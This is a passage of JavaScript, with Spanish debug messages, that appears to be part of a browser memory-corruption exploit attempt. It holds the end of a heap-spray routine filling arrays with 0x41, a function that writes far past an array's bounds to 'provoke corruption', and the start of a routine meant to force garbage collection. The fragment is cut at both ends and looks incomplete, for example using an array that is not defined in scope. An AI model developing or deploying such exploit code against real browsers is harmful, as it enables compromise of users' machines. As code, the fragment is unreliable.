    for(let j=0; j<1024; j++) arr[j] = 0x41; // 'A'
    arrays.push(arr);

  debug("Spray completado.");
  return arrays;
}

function triggerCorruption() {
  debug("Intentando acceso fuera de límites para provocar corrupción...");

  try {

    for(let i=0; i<10000; i++) {
      arr[i] = 0xFF;
    }
    debug("Acceso fuera de límites ejecutado.");
  } catch(e) {
    debug("Error detectado: " + e.message);
  }
}

function forceGC() {
  debug("Intentando forzar Garbage Collector...");
  for(let i=0; i<10000; i++) {
